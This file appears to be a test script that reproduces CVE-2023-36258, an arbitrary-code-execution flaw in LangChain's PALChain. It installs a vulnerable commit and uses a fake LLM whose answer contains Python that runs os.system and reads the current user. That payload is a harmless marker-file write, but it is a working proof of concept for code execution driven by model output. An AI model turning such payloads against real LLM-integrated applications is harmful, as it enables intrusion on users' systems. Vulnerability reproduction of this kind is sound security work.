#!/usr/bin/env python3
"""
Test to reproduce CVE-2023-36258: Arbitrary code execution in PALChain.
GitHub Advisory: GHSA-gjjr-63x4-v8cq
"""

import sys
import os
import tempfile
import subprocess
import git
import shutil
from typing import Optional

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def setup_vulnerable_langchain() -> Optional[str]:
    """Check out the vulnerable version of LangChain.
    
    Returns:
        Path to the cloned repository if successful, None otherwise
    """
    print("Setting up vulnerable LangChain for CVE-2023-36258...")
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    
    try:
        # Clone the LangChain repository
        print(f"Cloning LangChain repository to {temp_dir}...")
        repo = git.Repo.clone_from("https://github.com/langchain-ai/langchain.git", temp_dir)
        
        # Checkout the vulnerable version
        # The vulnerable version is before the fix in commit fdb6dbb
        # We'll use the version just before this commit
        print("Checking out vulnerable version...")
        commit_hash = "944321c6ab9134ffe1483f5b4897254328d3d384"  # Commit right before fix
        repo.git.checkout(commit_hash)
        
        # Install the package in development mode
        print("Installing vulnerable LangChain version...")
        subprocess.run([sys.executable, "-m", "pip", "install", "-e", temp_dir], 
                      capture_output=True, check=True)
        
        print("Vulnerable LangChain setup complete.")
        return temp_dir
    except Exception as e:
        print(f"Failed to set up vulnerable LangChain: {str(e)}")
        shutil.rmtree(temp_dir)
        return None


def cleanup_environment(repo_dir: str):
    """Clean up the environment after testing.
    
    Args:
        repo_dir: Path to the repository directory
    """
    print("Cleaning up environment...")
    
    # Uninstall the vulnerable version
    subprocess.run([sys.executable, "-m", "pip", "uninstall", "-y", "langchain"], 
                  capture_output=True)
    
    # Remove the temporary directory
    shutil.rmtree(repo_dir)
    
    # Reinstall the normal version
    subprocess.run([sys.executable, "-m", "pip", "install", "langchain"], 
                  capture_output=True)
    
    print("Cleanup complete.")


def create_exploit_test():
    """Create a test file to trigger the vulnerability.
    
    Returns:
        Path to the test file
    """
    fd, path = tempfile.mkstemp(suffix=".py")
    
    with os.fdopen(fd, "w") as f:
        f.write("""
import os
import sys
from langchain.chains import PALChain
from langchain.llms.fake import FakeListLLM

# Setup a fake LLM that returns a Python solution with code execution
fake_answers = ['''
Here's the solution:

```python
import os
print(f"Code execution! Current directory: {os.getcwd()}")
print(f"User: {os.getlogin()}")
os.system("echo 'CVE-2023-36258 exploited!' > /tmp/cve_test.txt")
result = 42
```

The answer is 42.
''']

# Create the vulnerable PALChain
llm = FakeListLLM(responses=fake_answers)
pal_chain = PALChain.from_math_prompt(llm, verbose=True)

# Run with a simple math problem to trigger the vulnerability
result = pal_chain.run("What is 6 times 7?")
print(f"Result: {result}")

# Check if the exploit succeeded
if os.path.exists("/tmp/cve_test.txt"):
    print("Vulnerability EXPLOITED!")
    with open("/tmp/cve_test.txt", "r") as f:
        print(f.read().strip())
else:
    print("Exploit failed. Vulnerability may have been patched.")
""")
    
    return path


def test_cve_2023_36258():
    """Test for the PALChain code execution vulnerability.
    
    Returns:
        True if the vulnerability was confirmed, False otherwise
    """
    print(f"{'=' * 80}")
    print(f"Testing for CVE-2023-36258: PALChain arbitrary code execution")
    print(f"{'=' * 80}")
    
    # Setup the vulnerable version of LangChain
    repo_dir = setup_vulnerable_langchain()
    if not repo_dir:
        print("Failed to set up the test environment.")
        return False
    
    try:
        # Create an exploit test file
        test_file = create_exploit_test()
        
        # Run the test
        print("\nRunning exploit test...")
        process = subprocess.run([sys.executable, test_file], 
                                capture_output=True, text=True)
        
        # Check the output
        print("\nTest output:")
        print(process.stdout)
        
        if "Vulnerability EXPLOITED!" in process.stdout:
            print("\nVULNERABILITY CONFIRMED: PALChain allows arbitrary code execution")
            # Check if the file was created
            if os.path.exists("/tmp/cve_test.txt"):
                os.remove("/tmp/cve_test.txt")
            return True
        else:
            print("\nVulnerability not detected. The version may be patched.")
            return False
    
    except Exception as e:
        print(f"Error during testing: {str(e)}")
        return False
    
    finally:
        # Clean up
        cleanup_environment(repo_dir)


if __name__ == "__main__":
    result = test_cve_2023_36258()
    sys.exit(0 if result else 1)